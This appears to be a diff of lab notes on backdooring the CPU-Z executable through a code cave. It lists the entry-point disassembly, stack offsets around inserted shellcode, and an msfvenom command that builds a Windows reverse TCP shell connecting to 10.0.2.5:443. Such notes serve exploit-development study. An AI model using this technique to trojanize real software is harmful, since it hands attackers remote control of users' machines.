@@ -1,3 +1,19 @@
-app : cpuz
-version : 1.02
+0042E000 - code cave starts here
 
+00407274 >/$ 55             PUSH EBP
+00407275  |. 8BEC           MOV EBP,ESP
+00407277  |. 6A FF          PUSH -1
+00407279  |. 68 58E24100    PUSH cpuz.0041E258
+0040727E  |. 68 40704000    PUSH cpuz.00407040                       ;  SE handler installation
+
+Before our shellcode, esp is at 0012FFA0
+
+After shellcode, esp is at 0012FD9C
+
+difference
+
+: 204
+
+
+
+msfvenom -p windows/shell_reverse_tcp LHOST=10.0.2.5 LPORT=443 -f hex
